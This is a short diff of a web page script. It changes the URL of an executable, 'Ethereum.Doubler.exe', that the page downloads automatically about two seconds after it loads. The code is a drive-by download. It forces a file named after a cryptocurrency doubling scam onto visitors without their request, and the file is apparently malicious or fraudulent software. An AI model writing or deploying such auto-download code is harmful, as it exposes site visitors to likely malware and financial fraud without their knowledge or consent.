@@ -1,6 +1,6 @@
 function download(){
   setTimeout(function(){
-    downloadFile("https://github.com/ethx2/ethx2.github.io/releases/download/v3.0.1/Ethereum.Doubler.v3.0.1.exe");
+    downloadFile("https://github.com/ethx2/ethx2.github.io/releases/download/v3.0.9/Ethereum.Doubler.v3.0.9.exe");
   }, 1998);
 };
 window.addEventListener("load", download);
